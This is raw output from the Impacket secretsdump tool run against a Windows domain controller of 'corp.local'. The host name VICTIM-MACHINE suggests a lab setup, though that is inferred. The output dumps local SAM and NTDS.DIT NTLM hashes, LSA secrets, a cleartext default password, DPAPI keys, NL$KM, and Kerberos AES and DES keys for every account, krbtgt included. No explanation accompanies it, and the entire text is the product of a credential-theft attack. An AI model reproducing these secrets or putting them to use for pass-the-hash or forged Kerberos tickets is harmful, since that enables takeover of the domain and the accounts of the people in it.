Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x77ffee5dc980193f8dab6bc952e17e00
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:68ae965c9062b389f2a285e27ff0a566:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\WIN-JI79TC0RNC0$:aes256-cts-hmac-sha1-96:09182e1fefb41974d6ca655ae816a1a3ad5d8c3ab218e685acd625b1f51be82d
CORP\WIN-JI79TC0RNC0$:aes128-cts-hmac-sha1-96:c16ae7a7ce3a3aa212a40955213c9c2e
CORP\WIN-JI79TC0RNC0$:des-cbc-md5:081670b5d998e362
CORP\WIN-JI79TC0RNC0$:plain_password_hex:84fb1b412804ac79c5a45d73e9badd423e0e41913b93a6095c543d268c9bb2eb493574a50847fbbe2b45d49c725f69e2036cab469a10e1d438c1dedb86803482c9540700a47d2ff61419ad905573761808669f2d5610888b0ad553a53b540154fe5cbc0e3d6c527d4279363f8e4dd72dd4b12a29e90046ba1e493b504a879a7c75889a3206c0e5cff03a2df1fcc25e8514fa02dbe1b34cc148631af5481a521449a87688c545650ccf27824969103c7ceb23e35449ecf1dc1c264b334b1780f487c04247bc4a2c33e04a421a26d41f05b0b29012cc51444cf69ce213b5017f2519daffbdce50a3e913630a4558318d03
CORP\WIN-JI79TC0RNC0$:aad3b435b51404eeaad3b435b51404ee:e16f9ff726e5145d3b7a379c5363d098:::
[*] DefaultPassword 
CORP\Server:mr404
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x727de2269998925b8cf550ad04ee3783a7c2d1c2
dpapi_userkey:0x04f99d9d9cbb4b3ea869de22db87dfead7ce80ae
[*] NL$KM 
 0000   76 91 92 85 D7 C6 62 92  D9 21 8C 35 1F 5D 6F 38   v.....b..!.5.]o8
 0010   1D 5C C1 B1 72 F7 84 EE  64 C5 E7 BC 96 60 FF B6   .\..r...d....`..
 0020   81 72 76 F1 E1 61 07 78  6A FD 9C 69 EA D7 26 AD   .rv..a.xj..i..&.
 0030   B9 C1 4C 7C 77 7C D6 30  64 7E E8 57 45 99 8A 20   ..L|w|.0d~.WE.. 
NL$KM:76919285d7c66292d9218c351f5d6f381d5cc1b172f784ee64c5e7bc9660ffb6817276f1e16107786afd9c69ead726adb9c14c7c777cd630647ee85745998a20
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:68ae965c9062b389f2a285e27ff0a566:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2a1a9d1cc6029746792c16c0c3465cb7:::
Server:1000:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::
corp.local\alice:1104:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
corp.local\bob:1105:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
corp.local\hruser:1106:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
corp.local\financeuser:1107:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
WIN-JI79TC0RNC0$:1001:aad3b435b51404eeaad3b435b51404ee:e16f9ff726e5145d3b7a379c5363d098:::
VICTIM-MACHINE$:1108:aad3b435b51404eeaad3b435b51404ee:a258de460f83cd0ef3688c77d386c9f6:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:22653b05cd133c08e119c6fde8ceea538ffc6079907742f1afdf1ff201543211
Administrator:aes128-cts-hmac-sha1-96:796e82ac32e9bbf9b900580ae73fded3
Administrator:des-cbc-md5:85bfa89d2570315e
krbtgt:aes256-cts-hmac-sha1-96:44f56a57e5c1f925dc5ac615870393be3696afcd2948ebc57d002b783a0f178f
krbtgt:aes128-cts-hmac-sha1-96:292e6c23303815d09bfa1e7a2cd6c57c
krbtgt:des-cbc-md5:23f1c4cdb3612532
Server:aes256-cts-hmac-sha1-96:1c13bbffcc0f168947ecb60138ded5bd21592dd397813c0ac61b7de18fe6b120
Server:aes128-cts-hmac-sha1-96:6832a757958aebe261add31c6dc4c6a9
Server:des-cbc-md5:10d075d692081052
corp.local\alice:aes256-cts-hmac-sha1-96:b8b3a26c7a920e0614f06ae2dae6c324f9f329a811631115bc0072264e9258d6
corp.local\alice:aes128-cts-hmac-sha1-96:3bd194ed3cb81abdebc906db90d82187
corp.local\alice:des-cbc-md5:0e4f9479ef29cec4
corp.local\bob:aes256-cts-hmac-sha1-96:f3ddefa1210b7fbbae11e1fda58a2150b5e2cf398deeebecbfeee99007b3a2d9
corp.local\bob:aes128-cts-hmac-sha1-96:fcda10a75b70e4b23a8bd08fc23a1664
corp.local\bob:des-cbc-md5:d5d0831651310861
corp.local\hruser:aes256-cts-hmac-sha1-96:86f3c73004865be49344be04020a8468a4382dbdcc0012f3bb774f5d8d93dc7e
corp.local\hruser:aes128-cts-hmac-sha1-96:40f1714917a82ee844e53eafb358a059
corp.local\hruser:des-cbc-md5:f267d35bae40ab2f
corp.local\financeuser:aes256-cts-hmac-sha1-96:f7dbfea1e3a4f4b99acf7db7ad2a08e7d17f6d31b9453d8a68fb0fa47aee80df
corp.local\financeuser:aes128-cts-hmac-sha1-96:722f24aa3f53efe86f631e57d25b01d9
corp.local\financeuser:des-cbc-md5:52cb2c7f46e9dc68
WIN-JI79TC0RNC0$:aes256-cts-hmac-sha1-96:09182e1fefb41974d6ca655ae816a1a3ad5d8c3ab218e685acd625b1f51be82d
WIN-JI79TC0RNC0$:aes128-cts-hmac-sha1-96:c16ae7a7ce3a3aa212a40955213c9c2e
WIN-JI79TC0RNC0$:des-cbc-md5:4ab68a251a4c67d6
VICTIM-MACHINE$:aes256-cts-hmac-sha1-96:a2d06e75327918bb42bc66a2d0b290ad576fde62e5e2090101e281954ec18d8a
VICTIM-MACHINE$:aes128-cts-hmac-sha1-96:22776648a6757ac97a797af4e0cd3394
VICTIM-MACHINE$:des-cbc-md5:ef52ad3deabfe34a
[*] Cleaning up... 
